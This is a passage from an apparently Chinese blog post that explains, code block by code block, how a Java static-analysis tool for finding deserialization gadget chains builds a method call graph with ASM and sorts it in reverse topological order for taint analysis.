的继承信息，保存到 inheritanceMap.dat</span></span><br><span class="line">    InheritanceDeriver.derive(classMap).save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-PassthroughDiscovery"><a href="#5-PassthroughDiscovery" class="headerlink" title="5. PassthroughDiscovery"></a>5. PassthroughDiscovery</h2><p><code>discover</code> 方法主要执行了三个步骤：① 搜索方法调用信息，即每个方法都调用了哪些方法；② 将调用信息进行逆拓扑排序，为了便于后续分析；③ 分析每个方法的参数，判断是否能够传递污染，即方法的返回结果是否可以被其参数影响。</p><p>例如以下两个方法中，foo 方法的返回结果可以被参数控制，而 bar 方法的返回结果无法被控制。因此如果污点（攻击者的输入数据）走到 bar 方法就不能再继续下去了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String <span class="title function_">foo</span><span class="params">(String v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String <span class="title function_">bar</span><span class="params">(String v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> 方法的具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法调用信息：方法-&gt;调用的方法集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// 数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 得到每个方法能够传递污染的参数（索引）集合</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  配置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 加载方法信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// 加载类信息</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// 加载继承信息（inheritanceMap：子类-&gt;父类集合，subClassMap：父类-&gt;子类集合）</span></span><br><span class="line">    <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 搜索方法的调用关系（methodCalls）并得到 `类名-&gt;类资源` 映射集合</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对方法的调用关系进行逆拓扑排序</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分析每个方法能够传递污染的参数</span></span><br><span class="line">    <span class="comment">// classResourceByName  类资源集合</span></span><br><span class="line">    <span class="comment">// classMap             类信息</span></span><br><span class="line">    <span class="comment">// inheritanceMap       继承信息</span></span><br><span class="line">    <span class="comment">// sortedMethods        方法集合（经逆拓扑排序）</span></span><br><span class="line">    <span class="comment">// SerializableDecider  序列化决策者</span></span><br><span class="line">    passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">            config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discoverMethodCalls</code> 方法利用 asm 的访问者记录方法调用的方法集合信息，同时存储类名和类资源的映射关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 搜索方法调用信息：方法-&gt;被调用方法集合</span></span><br><span class="line"><span class="comment"> * 存储类资源映射信息：类名-&gt;类资源</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 类名-&gt;类资源</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍历所有的类</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123; <span class="comment">// 读取类文件</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);   <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 继承 asm 的 ClassVisitor(MethodVisitor) 实现对类文件的观察</span></span><br><span class="line">                <span class="type">MethodCallDiscoveryClassVisitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCallDiscoveryClassVisitor</span>(Opcodes.ASM6);</span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(visitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                <span class="comment">// 存储 `类名(String)-&gt;类资源(ClassResource)` 的映射关系</span></span><br><span class="line">                classResourcesByName.put(visitor.getName(), classResource);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classResourcesByName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryClassVisitor</code> 类继承了 asm 中的 ClassVisitor，重写了三个访问者方法，并实现了一个返回类名的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MethodCallDiscoveryClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodCallDiscoveryClassVisitor</span><span class="params">(<span class="type">int</span> api)</span> &#123;   <span class="comment">// 访问者实现的 ASM API 版本，必须是 Opcodes.</span></span><br><span class="line">        <span class="built_in">super</span>(api);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 类名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回类名</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> 方法只记录了当前访问的类的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature,</span></span><br><span class="line"><span class="params">                  String superName, String[] interfaces)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.name != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;ClassVisitor already visited a class!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录类名</span></span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> 方法使用 <code>MethodCallDiscoveryMethodVisitor</code> 类（继承了 asm 中的 MethodVisitor）观察方法，并调用 <code>JSRInlinerAdapter</code> 简化代码分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                 String signature, String[] exceptions)</span> &#123;</span><br><span class="line">    <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    <span class="comment">// 创建 MethodCallDiscoveryMethodVisitor 观察方法</span></span><br><span class="line">    <span class="type">MethodCallDiscoveryMethodVisitor</span> <span class="variable">modelGeneratorMethodVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCallDiscoveryMethodVisitor</span>(</span><br><span class="line">            api, mv, <span class="built_in">this</span>.name, name, desc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 简化代码分析，删除 JSR 指令并内联引用的子例程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> 方法直接调用的父类方法，在这里不重写应该可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryMethodVisitor</code> 类继承了 asm 中的 MethodVisitor，只重写了 <code>visitMethodInsn</code> 方法，用于访问调用方法的指令；利用 <code>calledMethods</code> 记录当前访问的方法调用的所有方法，然后记录到 <code>methodCalls</code> 变量中，这里不注意点就看混了😵。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MethodCallDiscoveryMethodVisitor</span> <span class="keyword">extends</span> <span class="title class_">MethodVisitor</span> &#123;</span><br><span class="line">    <span class="comment">// 方法调用的方法集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;MethodReference.Handle&gt; calledMethods;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法访问者构造函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> api   ASM API 版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mv    MethodVisitor 实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner 方法所属类的类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name  方法的名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc  方法的描述符</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> api, <span class="keyword">final</span> MethodVisitor mv,</span></span><br><span class="line"><span class="params">                                            <span class="keyword">final</span> String owner, String name, String desc)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(api, mv);</span><br><span class="line">        <span class="comment">// 调用的方法集合，初始化</span></span><br><span class="line">        <span class="built_in">this</span>.calledMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 存储到 PassthroughDiscovery 的 methodCalls 中</span></span><br><span class="line">        methodCalls.put(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc), calledMethods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 访问方法指令</span></span><br><span class="line"><span class="comment">     * 方法指令是调用方法的指令</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> opcode 调用操作码：INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC, INVOKEINTERFACE</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner  被调用的方法所属类的类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   被调用的方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc   被调用方法的描述符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> itf    被调用的类是否为接口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">        <span class="comment">// 记录调用的方法，存储到 MethodCallDiscoveryMethodVisitor 的 calledMethods 中</span></span><br><span class="line">        calledMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">        <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>topologicallySortMethodCalls</code> 方法对方法调用的方法集合进行逆拓扑排序，用于后续判断方法参数与返回值的关系，举个例子：</p><p>方法 parentMethod 在返回前调用了 Obj.childMethod，因为 Obj.childMethod 的参数 carg 与返回值有关，同时 parentMethod 将其返回值作为自己的返回结果，所以最后可以判定 parentMethod 的参数 arg 和返回值有关。</p><p>因此要先判断子方法返回值与子方法参数的关系，再判断父方法返回值与参数的关系，这样才能判断方法参数与返回值的关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parentMethod</span><span class="params">(String arg)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">vul</span> <span class="operator">=</span> Obj.childMethod(arg);</span><br><span class="line">    <span class="keyword">return</span> vul;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">childMethod</span><span class="params">(String carg)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> carg.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了实现先判断子方法后判断父方法，这里就需要进行逆拓扑排序，逆拓扑排序使用栈实现，变量 <code>dfsStack</code> 和 <code>visitedNodes</code> 用于避免形成环，同时 <code>visitedNodes</code> 还可以避免重复排序，具体的排序操作由 <code>dfsTsort</code> 实现，所有方法调用整合为一个集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对方法的调用关系进行逆拓扑排序（按名称逆序）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">    <span class="comment">// 拷贝方法调用的方法集合</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">        MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> entry.getKey(); <span class="comment">// 方法</span></span><br><span class="line">        outgoingReferences.put(method, <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(entry.getValue()));    <span class="comment">// 调用的方法集合</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Topological sort methods</span></span><br><span class="line">    LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();     <span class="comment">// 避免形成环</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(); <span class="comment">// 在调用链出现重合时，避免重复排序</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(outgoingReferences.size());    <span class="comment">// 方法调用集合</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">        <span class="comment">// 遍历集合中的起始方法，进行递归搜索（DFS），经过逆拓扑排序，调用链的最末端排在最前面，</span></span><br><span class="line">        <span class="comment">// 后续进行参数、返回值、调用链之间的污点传递分析</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 逆拓扑排序后的方法调用集合</span></span><br><span class="line">    <span class="keyword">return</span> sortedMethods;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆拓扑排序的具体实现</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outgoingReferences 方法调用的方法集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods      逆拓扑排序后的方法集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> visitedNodes       已排序的方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stack              栈</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> node               待排序的起始方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span><br><span class="line"><span class="params">                             List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span><br><span class="line"><span class="params">                             Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> &#123;</span><br><span class="line">    <span class="comment">// 防止在遍历一条调用链中进入循环</span></span><br><span class="line">    <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止对某个方法及被调方法重复排序</span></span><br><span class="line">    <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据起始方法，取出被调用的方法集合</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">    <span class="keyword">if</span> (outgoingRefs == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stack.add(node);    <span class="comment">// 入栈，避免递归死循环</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123; <span class="comment">// 对被调用方法递归进行排序</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">    &#125;</span><br><span class="line">    stack.remove(node); <span class="comment">// 出栈，方法排序完毕</span></span><br><span class="line">    visitedNodes.add(node);     <span class="comment">// 记录已访问的方法，在递归遇到重复方法时可以跳过</span></span><br><span class="line">    sortedMethods.add(node);    <span class="comment">// 记录已排序的方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后使用 <code>calculatePassthroughDataflow</code> 方法判断每个方法的返回值与参数关系，首先跳过静态代码块，然后利用 asm 的访问者对逆拓扑排序得到的方法集合进行遍历和分析判断。</p><ul><li>静态代码块在类加载时调用，只执行一次，且优先于主函数。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分析方法调用集合，获取数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceByName 类资源集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classMap            类信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap      继承信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sortedMethods       所有方法集合（经过逆拓扑排序）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> serializableDecider 序列化决策者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, 